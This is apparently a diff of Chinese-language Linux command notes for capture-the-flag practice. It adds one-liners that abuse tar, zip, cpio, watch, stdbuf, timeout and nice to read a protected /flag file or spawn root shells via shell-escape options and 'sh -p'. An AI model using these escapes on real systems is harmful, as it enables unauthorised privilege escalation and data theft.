@@ -2,6 +2,29 @@ https://www.man7.org/linux/man-pages/man1/intro.1.html
 
 ## 文件/编码
 
+### genisoimage - 创建具有可选 Rock Ridge 属性的 ISO9660/Joliet/HFS 文件系统
+
+https://linux.die.net/man/1/genisoimage
+
+```sh
+genisoimage [options] [-o filename] pathspec [pathspec ...] 
+```
+
+- `-o` `filename`  
+    指定 ISO9660 文件系统映像的输出文件。这可以是磁盘文件、磁带驱动器，也可以直接对应光盘写入器的设备名。如果未指定，则使用 stdout
+
+- `-sort` `sort_file`  
+    对介质上的文件位置进行排序。
+	> 错误信息泄露文件内容
+
+```sh
+# 读取拥有权限的文件
+genisoimage -o - 拥有权限的文件
+
+# 错误信息泄露
+genisoimage -sort /flag
+```
+
 ### od - 以八进制和其他格式转储文件
 
 https://www.man7.org/linux/man-pages/man1/od.1.html
@@ -12,34 +35,290 @@ od [-abcdfilosx]... [file] [[+]offset[.][b]]
 od [option]... --traditional [file] [[+]offset[.][b] [[+]label[.][b]]]
 ```
 
-将 FILE 的不明确表示形式（默认为八进制字节）写入标准输出。如果提供多个 FILE 参数，则按列出的顺序将它们连接起来形成输入。如果没有 FILE，或 FILE 为-，则读取标准输入。
+将文件 `FILE` 的内容以默认的八进制字节格式写入标准输出。如果提供多个 `FILE` 参数，则按指定顺序连接它们作为输入。
 
-- `-A radix`
-    `--address-radix=radix`
-    选择文件偏移量的基数
-    - `n`
-        none (do not print offsets). 
-- `-t type`
-    `--format=type`
+- `-A radix`, `--address-radix=radix`  
+    文件偏移量的输出格式；RADIX 是 `[doxn]` 中的一种，用于十进制、八进制、十六进制或无。
+    - `n`  
+        无偏移量
+
+- `-t type`  `--format=type`  
 	选择文件数据的输出格式。type 是一个由以下类型标识符字符之一组成的字符串。
-    - `x`
-        hexadecimal
 
     除了类型“a”和“c”之外，您可以通过在类型指示符字符后面加一个十进制整数来指定在解释给定数据类型中的每个数字时使用的字节数。
 
 传统规范格式：
-- `-c`
+- `-a`  
+    与 `-t a` 相同，选择命名字符，忽略高阶字符比特
+
+- `-c`  
 	与 `-t c` 相同，选择 ASCII 字符或反斜杠转义
 
 
-示例
-```sh
-echo -n 'abcdef' | od -An -tx1
-#  61 62 63 64 65 66
+`TYPE` 由以下一种或多种规格组成：
+- `a`  
+    ascii
 
-echo -n 'abcdef' | od -An -tx2
-#  6261 6463 6665
+- `x[SIZE]`  
+    16进制
+
+示例
+```console
+$ echo -n 'abcdef' | od -An -tx1
+   61 62 63 64 65 66
+
+$ echo -n 'abcdef' | od -An -tx2
+   6261 6463 6665
+
+# 无偏移量，输出 ascii
+$ echo -n 'abcdef' | od -An -ta
+   a   b   c   d   e   f
 ```
+
+### bzip2, bunzip2 bzcat bzip2recover - 压缩或扩展文件
+
+https://linux.die.net/man/1/bzip2
+
+```sh
+bzip2 [ -cdfkqstvzVL123456789 ] [ filenames ... ]
+bunzip2 [ -fkvsVL ] [ filenames ... ]
+bzcat [ -s ] [ filenames ... ]
+bzip2recover filename
+```
+
+- `-d --decompress`  
+	强制解压缩
+
+- `-z --compress`
+	强制压缩
+
+- `-c --stdout`  
+	压缩或解压到标准输出。
+
+```sh
+bzip2 -c /flag | bzip2 -d
+```
+
+### zip - 打包和压缩（归档）文件
+
+
+https://linux.die.net/man/1/zip
+```sh
+zip [-aABcdDeEfFghjklLmoqrRSTuvVwXyz!@$] [--longoption ...] [-b path] [-n suffixes] [-t date] [-tt date] [zipfile [file ...]] [-xi list] 
+```
+
+```sh
+# 读取文件
+zip my_flag.zip /flag && unzip -c my_flag.zip 
+
+# 交互 shell
+# 测试命令后添加注释符号 `#` 以分离后缀，或任意分隔符
+zip foo.zip foo.zip -T -TT "/bin/sh #"
+```
+
+#### 使用
+
+**命令格式。** 基本命令格式为
+
+```sh
+zip options archive inpath inpath ...
+```
+
+其中 `archive` 是新的或现有的 `zip` 归档，`inpath` 是目录或文件路径，可选地包含通配符。当给定现有 `zip` 归档的名称时，`zip` 将替换 `zip` 归档中同名的条目（匹配归档中存储的相对名称）或为新名称添加条目。例如，如果 `foo.zip` 存在并包含 `foo/file1` 和 `foo/file2`，而目录 `foo` 包含文件 `foo/file1` 和 `foo/file3`，那么：
+
+```sh
+zip -r foo.zip foo
+```
+
+或更简洁地
+
+```sh
+zip -r foo foo
+```
+
+**`-@` 文件列表。** 如果文件列表指定为 `-@` [MacOS 上不可用]，`zip` 从标准输入而不是命令行获取输入文件列表。例如，
+
+```sh
+zip -@ foo
+```
+
+将标准输入中每行列出的文件存储到 `foo.zip` 中。
+
+在 Unix 下，此选项与 `find` (1) 命令结合使用可以产生强大效果。例如，要归档当前目录及其子目录中的所有 C 源文件：
+
+```sh
+find . -name "*.[ch]" -print | zip source -@
+```
+
+（注意模式必须加引号，以防止 shell 展开它）。
+
+**流式输入和输出。** `zip` 还接受单个短横线（`-`）作为 zip 文件名，在这种情况下，它将 zip 文件写入标准输出，允许将输出管道传输到另一个程序。例如：
+
+```sh
+zip -r - . | dd of=/dev/nrst0 obs=16k
+```
+
+会将 zip 输出直接写入具有指定块大小的磁带，以备份当前目录。
+
+`zip` 还接受单个短横线（`-`）作为要压缩文件的名称，在这种情况下，它将从标准输入读取文件，允许 zip 从另一个程序获取输入。例如：
+
+```sh
+tar cf - . | zip backup -
+```
+
+#### 参数
+
+- `-r`, `--recurse-paths`  
+    递归遍历目录结构；例如：
+
+    ```sh
+    zip -r foo.zip foo
+    ```
+
+- `-X, --no-extra`  
+	不要保存额外的文件属性
+
+- `-TT cmd`, `--unzip-command cmd`  
+    使用命令 `cmd` 而不是 `unzip -tqq` 来测试归档（当使用 `-T` 选项时）。在 Unix 上，要使用当前目录中的 unzip 副本而不是标准系统 unzip，可以使用：
+
+    ```sh
+    zip archive file1 file2 -T -TT "./unzip -tqq"
+    ```
+
+    在 `cmd` 中，`{}` 被替换为临时归档的名称，否则归档名称附加到命令末尾。检查返回代码是否成功（Unix 上为 0）。
+
+### unzip - 解压 zip 归档文件
+
+https://linux.die.net/man/1/unzip
+
+```sh
+unzip [-Z] [-cflptTuvz[abjnoqsCDKLMUVWX$/:^]] file[.zip] [file(s) ...] [-x xfile(s) ...] [-d exdir]
+```
+
+`unzip` 将列出、测试或提取 ZIP 归档中的文件
+
+- `-l`  
+    列出归档文件（短格式）。打印指定文件的名称、未压缩文件大小和修改日期时间，以及所有指定文件的总计。
+
+- `-v`  
+    列出归档文件（详细格式）或显示诊断版本信息。
+
+- `-p`  
+    将文件提取到管道（stdout）。除了文件数据外，不向 stdout 发送任何内容，并且文件始终以二进制格式提取，与存储时完全一样（无转换）。
+
+- `-c`  
+    将文件提取到 stdout/屏幕（“CRT”）。此选项类似于 `-p` 选项，但提取时会打印每个文件的名称，允许 `-a` 选项，并在适当时自动执行 ASCII-EBCDIC 转换。此选项未列在 `unzip` 使用屏幕中。
+
+
+### funzip - 用于在管道中从 ZIP 压缩包中提取文件的过滤器
+
+https://linux.die.net/man/1/funzip
+
+```sh
+funzip [-password] [input[.zip|.gz]] 
+```
+
+示例
+
+```sh
+zip - /flag | funzip
+```
+
+### cpio - 复制文件到和从归档
+
+在 copy-out 模式中，`cpio` 将文件复制到归档中。它从标准输入读取文件名列表（每行一个），并将归档写入标准输出。
+
+在 copy-in 模式中，`cpio` 从归档中复制文件或列出归档内容。它从标准输入读取归档。
+
+在 copy-pass 模式中，`cpio` 将文件从一个目录树复制到另一个目录树，结合 copy-out 和 copy-in 步骤而不实际使用归档。它从标准输入读取要复制的文件列表；要复制到的目录作为非选项参数给出。
+
+- `-o`, `--create`  
+    以 copy-out 模式运行。参见“Copy-out 模式”。
+
+- `-i`, `--extract`  
+    以 copy-in 模式运行。参见“Copy-in 模式”。
+
+- `-p`, `--pass-through`  
+    以 copy-pass 模式运行。参见“Copy-pass 模式”。
+
+- `-F`, `--file=archive`  
+    要使用的归档文件名，而不是标准输入或输出。要使用另一台机器上的磁带驱动器作为归档，请使用以 `HOSTNAME:` 开头的文件名。主机名前面可以加上用户名和 `@`，以便以该用户身份访问远程磁带驱动器（如果你有相应权限，通常是该用户的 `~/.rhosts` 文件中的条目）。
+
+- `-r`, `--rename`  
+    交互式重命名文件。
+
+- `-R [user][:.][group]`, `--owner [user][:.][group]`  
+    在 copy-out 和 copy-pass 模式下，将所有创建文件的所有权设置为指定用户和/或组。用户、组或两者必须存在。如果省略组但给出了 `:` 或 `.` 分隔符，则使用给定用户的登录组。只有超级用户可以更改文件的所有权。
+
+- `--to-stdout`  
+    将文件提取到标准输出。此选项可用于 copy-in 模式。
+
+- `--rsh-command=COMMAND`  
+    通知 `cpio` 应使用 `COMMAND` 与远程设备通信。
+
+示例：
+
+```sh
+# 标准输入输出流，读取文件内容
+ls /flag | cpio -o | cpio -i --to-stdout
+
+# 异常信息读取文件内容
+ls /flag | cpio -o
+
+# 复制文件，并修改属主/组
+ls /flag | cpio -p -R nobody.nogroup ~
+```
+
+```sh
+# 命令执行的完整权限 shell
+# 尝试远程连接时，预期 rsh 格式 `rsh [OPTION...] [USER@]HOST [COMMAND [ARG...]]`
+# 当传递有效的 HOST 名称 `localhost` 时，替换后的 rsh 命令将为：
+# `/bin/sh localhost` 此处主机名作为参数1传递，最终同名文件将被作为 shell 脚本执行
+echo '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' > localhost &&
+cpio -o --rsh-command '/bin/sh' -F localhost:
+```
+
+### ar - 创建、修改和从归档中提取
+
+https://man7.org/linux/man-pages/man1/ar.1.html
+
+```sh
+ar [-X32_64] [-]p[mod] [--plugin name] [--target bfdname]
+[--output dirname] [--record-libdeps libdeps] [--thin] [relpos]
+[count] archive [member...]
+```
+
+```sh
+# 快速归档，若不存在则创建
+ar qc my_flag.a /flag
+# 打印归档文件内容到标准输出
+ar p my_flag.a
+```
+
+`p` 操作码字母指定要执行的操作；它可以是以下任意一个，但只能指定其中一个：
+
+- `p`  
+    将归档的指定成员*打印*到标准输出文件。如果指定 `v` 修饰符，则在将其内容复制到标准输出之前显示成员名称。
+
+    如果未指定 `member` 参数，则打印归档中的所有文件。
+
+- `x`  
+    从归档中*提取*成员（名为 `member`）。你可以与此操作一起使用 `v` 修饰符，以请求 `ar` 在提取每个名称时列出它。
+
+    如果未指定 `member`，则提取归档中的所有文件。
+
+    无法从薄归档中提取文件，并且从使用 `P` 创建的归档中提取文件存在限制：路径不能是绝对路径，不能包含 `..`，并且路径中的任何子目录都必须存在。如果希望避免这些限制，则使用 `--output` 选项指定输出目录。
+
+- `q`  
+    *快速追加*；历史上，将文件 `member...` 添加到 `archive` 末尾，而不检查替换。
+
+- `r`  
+    将文件 `member...` 插入 `archive`（*替换*）。此操作与 `q` 的不同之处在于，如果任何先前存在的成员名称与要添加的名称匹配，则删除这些成员。
+
+许多修饰符（`mod`）可以紧跟在 `p` 操作码字母之后，以指定操作行为的变体：
+
+- `c`  
+    *创建*归档。当请求更新时，如果指定的 `archive` 不存在，它总是会被创建。但除非你通过使用此修饰符事先指定期望创建它，否则会发出警告。
 
 ### tar —— 归档
 
@@ -65,35 +344,132 @@ https://www.man7.org/linux/man-pages/man1/tar.1.html
     tar -x [-f ARCHIVE] [OPTIONS] [MEMBER...]
 ```
 
-Operation mode
-- `-c, --create`
-	创建一个新的存档。参数用于指定要归档的文件名。目录将被递归归档，除非指定了 `--no-recursion` 选项。
-- `-t, --list`
-    列出归档文件的内容。参数为可选。当提供时，用于指定要列出的成员名称。
-- `-x, --extract, --get`
-	从存档中提取文件
 
-OPTIONS       
-- `-f, --file=ARCHIVE`
-	使用归档文件或设备 `ARCHIVE`  
-- `-O, --to-stdout`
-	将文件提取到标准输出
-- `--exclude=PATTERN`
-    排除与模式 `PATTERN` 匹配的文件，该模式为 [glob(3)] 风格的通配符
-
-Compression options
-- `-z, --gzip, --gunzip, --ungzip`
-    通过 gzip(1) 过滤存档。
 
 示例
 ```sh
 # 创建归档文件，无压缩
 tar cf archive.tar inputfile.txt
 tar -c -f archive.tar inputfile.txt
+
 # 创建归档文件，并使用 gzip 压缩。此时扩展名应匹配压缩工具
 tar cfz archive.tar.gzip inputfile.txt
 tar -c -f archive.tar.gzip -z inputfile.txt
 ```
+
+```sh
+# tar 不支持 `/` 符号，设置 -C 以切换目录执行
+tar -c -f my_flag.tar -C / flag &&
+# 提取归档文件到标准输出
+tar -x -O -f my_flag.tar 
+
+# 标准输入输出流
+tar -c -f - -C / flag | tar -x -O -f -
+
+# 标准输出 + 命令执行
+tar -c -f - -C / flag | tar -x --to-command 'cat'
+```
+
+```sh
+# 交互 shell 的各种方式
+
+# 调用程序
+echo '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' > foo && tar -c -f - foo | tar -x --to-command '/bin/sh'
+
+# 命令过滤
+tar -x -f /dev/null -I '/bin/sh -c "/bin/sh </dev/tty >/dev/tty 2>/dev/tty"'
+
+tar -x -f /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
+
+# 远程连接
+echo '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' > localhost
+tar -x --rsh-command '/bin/sh' -f localhost:caffee
+
+# 检查点
+tar -x -f /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+#### 操作模式
+
+- `-c`, `--create`  
+    创建新归档。参数提供要归档的文件名称。除非给出 `--no-recursion` 选项，否则目录会被递归归档。
+
+- `-t`, `--list`  
+    列出归档内容。参数是可选的。给出时，它们指定要列出的成员名称。
+
+- `-x`, `--extract`, `--get`  
+    从归档中提取文件。参数是可选的。给出时，它们指定要提取的归档成员名称。
+
+#### 选项
+
+##### 输出流选择
+
+- `-O`, `--to-stdout`  
+    将文件提取到标准输出。
+
+- `--to-command=COMMAND`  
+    将提取的文件管道传输到 `COMMAND`。参数是外部程序的路径名，可选地带有命令行参数。程序将被调用，正在提取的文件内容通过其标准输入提供。
+
+##### 扩展文件属性
+
+- `--no-acls`  
+    禁用 POSIX ACL 支持。
+
+##### 设备选择和切换
+
+- `-f`, `--file=ARCHIVE`  
+    使用归档文件或设备 `ARCHIVE`。如果未给出此选项，`tar` 将首先检查环境变量 `TAPE`。如果设置了，其值将用作归档名称。否则，`tar` 将假定编译时的默认值。可以使用 `--show-defaults` 选项或在 `tar --help` 输出末尾检查默认值。
+
+    包含冒号的归档名称指定远程机器上的文件或设备。冒号前的部分被视为机器名或 IP 地址，冒号后的部分被视为文件或设备路径名，例如：
+
+    `--file=remotehost:/dev/sr0`
+
+    可选用户名可以加在主机名前，两者之间用 `@` 符号分隔。
+
+    默认情况下，远程主机通过 `rsh`(1) 命令访问。如今通常使用 `ssh`(1) 代替。可以通过给出以下命令行选项来实现：
+
+    `--rsh-command=/usr/bin/ssh`
+
+    远程机器应安装 `rmt`(8) 命令。如果其路径名与 `tar` 的默认值不匹配，可以使用 `--rmt-command` 选项告知 `tar` 正确的路径名。
+
+- `--rsh-command=COMMAND`  
+    访问远程归档时使用 `COMMAND` 代替 `rsh`。参见上面的 `-f` 选项描述。
+
+##### 压缩选项
+
+- `-a`, `--auto-compress`  
+    使用归档后缀确定压缩程序。
+
+- `--no-auto-compress`  
+    不使用归档后缀确定压缩程序。
+
+- `-I`, `--use-compress-program=COMMAND`  
+    通过 `COMMAND` 过滤数据。它必须接受 `-d` 选项以进行解压。参数可以包含命令行选项。
+
+- `-j`, `--bzip2`  
+    通过 `bzip2`(1) 过滤归档。
+
+- `-z`, `--gzip`, `--gunzip`, `--ungzip`  
+    通过 `gzip`(1) 过滤归档。
+
+##### 本地文件选择
+
+- `-C`, `--directory=DIR`  
+    在执行任何操作之前切换到 `DIR`。此选项对位置敏感，即它影响其后的所有命令行参数，因此其后出现的任何相对文件名将被视为相对于 `DIR`。但是，它不影响其后*命令行选项*的参数，例如 `-f`、`-T` 或 `-N`。
+
+##### 信息输出
+
+- `--checkpoint[=N]`  
+    每第 `N` 条记录显示进度消息（默认 10）。
+
+- `--checkpoint-action=ACTION`  
+    在每个检查点运行 `ACTION`。
+
+    - `exec` 动作执行给定的外部命令。例如：
+
+        ```console
+        $ tar -c --checkpoint=1000 --checkpoint-action=exec=/sbin/cpoint
+        ```
 
 #### gzip, gunzip, zcat - 压缩或扩展文件
 
@@ -107,16 +483,29 @@ zcat [ -fhLV ] [ name ... ]
 
 zcat 与 gunzip -c 完全相同。（在某些系统上，zcat 可能被安装为 gzcat 以保留对 compress 的原始链接。）zcat 会解压缩命令行上的文件列表或其标准输入，并将未压缩的数据写入标准输出。zcat 会解压缩具有正确魔数标记的文件，无论它们是否有 .gz 后缀。
 
-- `-d --decompress --uncompress`
+- `-d --decompress --uncompress`  
 	解压缩
-- `-c --stdout --to-stdout`
-	将输出写入标准输出；保留原始文件不变
 
-## ssh
+- `-c --stdout --to-stdout`  
+	将输出写入标准输出；保持原始文件不变。如果有多个输入文件，输出将由一系列独立压缩的成员组成。为获得更好的压缩效果，在压缩前应将所有输入文件连接起来。
+
+```sh
+gzip -c /flag | gzip -d
+```
+
+## 远程控制
+
+### rsh - 远程 shell 客户端
+
+```sh
+rsh [OPTION...] [USER@]HOST [COMMAND [ARG...]]
+```
+
+### ssh
 
 https://www.openssh.org/manual.html
 
-### ssh - OpenSSH 远程登录客户端
+#### ssh - OpenSSH 远程登录客户端
 
 https://www.man7.org/linux/man-pages/man1/ssh.1.html
 - https://man.openbsd.org/ssh
@@ -140,7 +529,7 @@ ssh 	[-Q query_option]
 ssh -i key hacker@dojo.pwn.college
 ``` 
 
-### ssh-keygen - 认证密钥生成、管理和转换
+#### ssh-keygen - 认证密钥生成、管理和转换
 
 https://www.man7.org/linux/man-pages/man1/ssh-keygen.1.html
 
@@ -251,8 +640,23 @@ hexdump [options] file ...
 hd [options] file ...
 ```
 
-- `-f format_file`
-	指定包含一个或多个由换行符分隔的格式字符串的文件。空行和以井号(#)作为第一个非空白字符的行将被忽略。
+`hexdump` 实用程序是一个过滤器，用于以用户指定的格式显示指定文件；如果未指定文件，则显示标准输入。
+
+- `-c`, `--one-byte-char`  
+    单字节字符显示。以十六进制显示输入偏移量，随后每行显示十六个以空格分隔、三列、空格填充的输入数据字符。
+
+- `-f`, `--format-file` `file`  
+    指定一个文件，其中包含一个或多个以换行分隔的格式字符串。空行以及第一个非空白字符为井号（`#`）的行会被忽略。
+
+- `-v`, `--no-squeezing`  
+    `-v` 选项使 `hexdump` 显示所有输入数据。不使用 `-v` 时，任意数量的、与紧邻前一组输出行相同（输入偏移量除外）的输出行组，都会替换为仅包含一个星号的一行。
+
+- `-e`, `--format` `format_string`  
+    指定用于显示数据的格式字符串。
+
+#### 格式
+
+格式字符串包含任意数量的格式单元，格式单元之间由空白分隔。一个格式单元最多包含三项：迭代次数、字节数和格式。
 
 ### xxd
 
@@ -264,21 +668,25 @@ xxd [options] [infile [outfile]]
 xxd -r[evert] [options] [infile [outfile]]
 ```
 
-- `-p | -ps | -postscript | -plain`  
-	输出为 postscript 连续十六进制转储风格。也称为 plain 十六进制转储风格。
+`xxd` 为给定文件或标准输入创建十六进制转储。它还可以将十六进制转储转换回原始二进制形式。
 
-- `-r | -revert ` 
-  反向操作：将 hexdump 转换为二进制格式。
+如果未给出 `infile`，则读取标准输入。如果 `infile` 指定为 `-` 字符，则从标准输入获取输入。如果未给出 `outfile`（或在其位置使用 `-` 字符），则结果发送到标准输出。
+
+- `-p`, `-ps`, `-postscript`, `-plain`  
+    以 PostScript 连续十六进制转储样式输出。也称为纯十六进制转储样式。
+
+- `-r`, `-revert`  
+    反向操作：将十六进制转储转换（或修补）为二进制。如果不写入标准输出，`xxd` 会写入其输出文件而不截断它。使用 `-r -p` 组合可读取不含行号信息且没有特定列布局的纯十六进制转储。允许在任何位置出现额外空白和换行。
 
 ```console
 # 字符串转十六进制字符串
-$ echo -n 'pwn' | xxd -ps
+$ echo -n 'pwn' | xxd -p
 70776e
 
 # 十六进制字符串还原到字符串
-$ echo 70776e | xxd -r -ps
+$ echo 70776e | xxd -r -p
 pwn
-$ echo 70 77 6e | xxd -r -ps
+$ echo 70 77 6e | xxd -r -p
 pwn
 ```
 
@@ -309,7 +717,242 @@ base64 [OPTION]... [FILE]
 - `-w, --wrap=COLS`
 	设置换行字符数量，默认76。设置0禁用换行
 
+## 架构
+
+### setarch 在新程序环境中更改报告的架构和/或设置个性标志
+
+https://man7.org/linux/man-pages/man8/setarch.8.html
+
+```sh
+setarch [arch] [options] [program [argument...]]
+arch [options] [program [argument...]]
+```
+
+```sh
+setarch --addr-no-randomize /bin/sh -p
+```
+
+- `--list`  
+    列出 `setarch` 已知的体系结构。`setarch` 是否能够实际设置每种体系结构取决于正在运行的内核。
+
+- `--show[=personality]`  
+    显示当前活动的 personality 和标志。如果提供了 `personality` 参数，则显示该 personality 而不是当前的。`personality` 是一个十六进制数字，其可能值在 `sys/personality.h` 中描述。
+
+- `-p`, `--pid=pid`  
+    与 `--show` 一起使用时，显示指定进程的 personality 和标志。
+
+- `-v`, `--verbose`  
+    详细模式。
+
+- `-3`, `--3gb`  
+    指定的 `program` 应使用最多 3GB 的地址空间。在 x86 上受支持。打开 `ADDR_LIMIT_3GB`。
+
+- `-B`, `--32bit`  
+    将地址空间限制为 32 位以模拟硬件。在 ARM 和 Alpha 上受支持。打开 `ADDR_LIMIT_32BIT`。
+
+- `-L`, `--addr-compat-layout`  
+    提供传统的虚拟地址空间布局。当 `program` 二进制文件没有 `PT_GNU_STACK` ELF 头时使用。打开 `ADDR_COMPAT_LAYOUT`。
+
+- `-R`, `--addr-no-randomize`  
+    禁用虚拟地址空间的随机化。打开 `ADDR_NO_RANDOMIZE`。
+
+- `-X`, `--read-implies-exec`  
+    如果设置了此项，则 `mmap(2)` 的 `PROT_READ` 也将添加 `PROT_EXEC` 位——如传统 x86 二进制文件所预期。请注意，ELF 加载器在遇到传统二进制文件时会自动设置此位。打开 `READ_IMPLIES_EXEC`。
+
+- `-Z`, `--mmap-page-zero`  
+    SVr4 错误模拟，将 `mmap(2)` 的零页设置为只读。当 `program` 依赖此行为且源代码不可用于修复时使用。打开 `MMAP_PAGE_ZERO`。
+
+### dmesg - 打印或控制内核环形缓冲区
+
+`dmesg [ -c ] [ -n level ] [ -s bufsize ]`
+
+dmesg 用于检查或控制内核环形缓冲区。
+
+- `-W, --follow-new`
+	等待并打印新信息
+
+例：
+- 查看内核保护状态
+
+	```sh
+	dmesg | grep -Ei 'NX|execute disable|SMEP|SMAP|KPTI'
+	[    0.000000] NX (Execute Disable) protection: active
+	```
+
+### insmod - 一个简单的程序，用于将模块插入 Linux 内核
+
+`insmod [OPTIONS] [filename] [module options]`
+
+insmod 是一个简单的程序，用于将模块插入内核。
+大多数用户会选择使用 modprobe(8) 来代替，因为它更聪明，并且能够处理模块依赖。
+
+只有最通用的错误消息会被报告：由于尝试链接模块的工作现在是在内核内部完成的，因此 dmesg(1) 通常会提供更多关于错误的信息。
+
+### lsmod - 显示 Linux 内核中模块的状态
+
+`lsmod [OPTIONS]`
+
+lsmod 是一个简单的程序，它可以很好地格式化 /proc/modules 的内容，显示当前加载的内核模块。
+
+
+### rmmod - 一个简单的程序，用于从 Linux 内核中移除模块
+
+`rmmod [OPTIONS] [list of modulenames]`
+
+rmmod 是一个简单的程序，用于从内核中移除一个模块或多个模块（当提供模块卸载支持时）。大多数用户会选择使用带 -r 选项的 modprobe(8)，因为它还会移除未使用的依赖模块。
+
+当提供模块列表时，程序将逐个处理它们。如果某个模块未找到，rmmod 会立即退出并返回错误代码。如果模块移除失败，程序将记录一个错误，并继续处理下一个模块。这种行为不受 --force 选项控制。
+
+### htop - 查看实时的进程、cpu、内存状态
+
 ## 进程
+
+### strace — 跟踪系统调用和信号
+
+https://www.man7.org/linux/man-pages/man1/strace.1.html
+
+```sh
+strace [-ACdffhikkqqrtttTvVwxxyyYzZ] [-a column] [-b execve]
+       [-e expr]... [-I n] [-o file] [-O overhead] [-p pid]...
+       [-P path]... [-s strsize] [-S sortby] [-U columns]
+       [-X format] [--seccomp-bpf]
+       [--stack-trace-frame-limit=limit] [--syscall-limit=limit]
+       [--secontext[=format]] [--tips[=format]] { -p pid | [-DDD]
+       [-E var[=val]]... [-u username] command [args] }
+
+strace -c [-dfwzZ] [-b execve] [-e expr]... [-I n] [-O overhead]
+       [-p pid]... [-P path]... [-S sortby] [-U columns]
+       [--seccomp-bpf] [--syscall-limit=limit] [--tips[=format]] {
+       -p pid | [-DDD] [-E var[=val]]... [-u username] command
+       [args] }
+
+strace --tips[=format]
+```
+
+在最简单的用法中，`strace` 运行指定的 `command` 直到其退出。它会拦截并记录进程发起的系统调用，以及进程接收到的信号。每个系统调用的名称、参数和返回值会打印到标准错误，或打印到由 `-o` 选项指定的文件。
+
+```sh
+# 输出摘要
+strace -c testa.py
+
+# 跟踪 write，输出摘要
+strace -e write -c testa.py
+```
+
+#### 选项
+
+##### 常规
+
+- `-e expr`  
+    通过指定限定表达式来修改要跟踪的事件或跟踪方式。表达式格式为：
+
+    ```sh
+    [qualifier=][!]value[,value]...
+    ```
+
+    其中 `qualifier` 是 `trace`（或 `t`）、`trace-fds`（或 `trace-fd`、`fd`、`fds`）、`abbrev`（或 `a`）、`verbose`（或 `v`）、`raw`（或 `x`）、`signal`（或 `signals`、`s`）、`read`（或 `reads`、`r`）、`write`（或 `writes`、`w`）、`fault`、`inject`、`status`、`quiet`（或 `silent`、`silence`、`q`）、`secontext`、`decode-fds`（或 `decode-fd`）、`decode-pids`（或 `decode-pid`）或 `kvm` 之一，`value` 是依赖于限定符的符号或数字。默认限定符是 `trace`。使用感叹号会否定值集合。例如，`-e open` 等价于 `-e trace=open`，意思是只跟踪 `open` 系统调用。相反，`-e trace=!open` 表示跟踪除 `open` 之外的每个系统调用。此外，特殊值 `all` 和 `none` 可分别用于跟踪每个事件或不跟踪任何事件。
+
+    注意，某些 shell 即使在带引号的参数中也会使用感叹号进行历史扩展。在这种情况下，必须用反斜杠转义感叹号。
+
+
+### 统计
+
+- 
+    ```
+    -c
+    --summary-only
+    ```
+    统计每个系统调用的时间、调用次数和错误数，并在程序退出时报告摘要，同时抑制常规输出。这会显示系统时间（在内核中花费的 CPU 时间），它与墙上时钟时间无关。如果 `-c` 与 `-f` 一起使用，则只保留所有被跟踪进程的聚合总计。
+
+### watch - 定期执行程序，全屏显示输出
+
+https://man7.org/linux/man-pages/man1/watch.1.html
+
+```sh
+watch [option ...] command
+```
+
+`watch` 重复运行 `command`，显示其输出和错误（第一屏内容）。这允许你观察程序输出随时间的变化。默认情况下，`command` 每 2 秒运行一次，`watch` 将一直运行直到被中断。标题栏会显示 `command` 的启动时间、运行时间以及退出码。
+
+```sh
+# 特权 shell 1：exec 外侧 sh -p 传递特权，内侧 sh -p 继承特权 shell
+watch -x /bin/sh -p -c 'reset; /bin/sh -p 1>&0 2>&0'
+
+# 特权 shell 2：设置当前 id 为 root，并启动特权 shell
+watch -x /bin/sh -p -c 'reset; setpriv --clear-groups --regid 0 --reuid 0 /bin/sh 1>&0 2>&0'
+watch -x setpriv --clear-groups --regid 0 --reuid 0 /bin/sh -c 'reset; /bin/sh 1>&0 2>&0'
+watch -x chroot --userspec=root:root / /bin/sh -c 'reset; /bin/sh 1>&0 2>&0'
+
+# 特权 shell 3：使用不降权的 shell
+watch -x zsh -c 'reset; zsh 1>&0 2>&0'
+
+# 无特权 shell：外侧 sh -c 丢失特权
+watch 'reset; /bin/sh 1>&0 2>&0'
+```
+
+- `-c`, `--color`  
+    解释 ANSI 颜色和样式序列。
+
+- `-C`, `--no-color`  
+    不解释 ANSI 颜色和样式序列。
+
+- `-x`, `--exec`  
+    将 `command` 传递给 `exec(3)` 调用而不是 `sh -c`。程序将启动得更快。Shell 功能（环境设置、变量和路径名展开等）将不可用。
+
+### stdbuf - 运行 `COMMAND`，并修改其标准流的缓冲操作。
+
+```sh
+stdbuf OPTION... COMMAND
+```
+运行 `COMMAND`，并修改其标准流的缓冲操作。
+
+```sh
+stdbuf -i0 -o0 -e0 /bin/sh -p
+```
+
+- `-i, --input=MODE`  
+    调整标准输入流缓冲
+
+- `-o, --output=MODE`  
+    调整标准输出流缓冲
+
+- `-e, --error=MODE`  
+    调整标准错误流缓冲
+
+如果 `MODE` 为 `L`，则相应流将采用行缓冲。此选项对标准输入无效。
+
+如果 `MODE` 为 `0`，则相应流将不缓冲。
+
+### timeout - 运行带时间限制的命令
+
+https://man7.org/linux/man-pages/man1/timeout.1.html
+
+```sh
+timeout [OPTION]... DURATION COMMAND [ARG]...
+```
+
+启动 `COMMAND`，如果它在 `DURATION` 之后仍在运行，则将其杀死。
+
+```sh
+# 交互 shell
+timeout 0 /bin/sh -p
+```
+
+### nice - 以修改后的调度优先级运行程序
+
+```sh
+nice [OPTION] [COMMAND [ARG]...]
+```
+
+以调整后的 niceness 运行 `COMMAND`，这会影响进程调度。没有 `COMMAND` 时，打印当前 niceness。niceness 值范围为 `-20`（对进程最有利）到 `19`（对进程最不利）。
+
+```sh
+# 交互 shell
+nice /bin/sh -p
+```
+
+- `-n, --adjustment=N`  
+    将整数 `N` 加到 niceness 上（默认 `10`）
 
 ### ps - 报告当前进程的快照
 
@@ -371,6 +1014,136 @@ kill -s 9 目标进程
 
 ## 用户
 
+### unshare - 在新命名空间中运行程序
+
+https://www.man7.org/linux/man-pages/man1/unshare.1.html
+
+```sh
+unshare [options] [program [arguments]]
+```
+
+`unshare` 命令创建新的命名空间（如下文所述命令行选项所指定），然后执行指定的 `program`。如果未给出 `program`，则运行 `${SHELL}`。如果未设置 `SHELL`，则使用用户 `passwd(5)` 条目中的 shell。如果那里也未定义 shell，则使用 `/bin/sh` 作为后备。
+
+```sh
+# 待测试，在命名空间内设置 id 为 root 的 交互式 shell
+unshare -Urm /bin/sh
+```
+
+- `-m`, `--mount[=file]`  
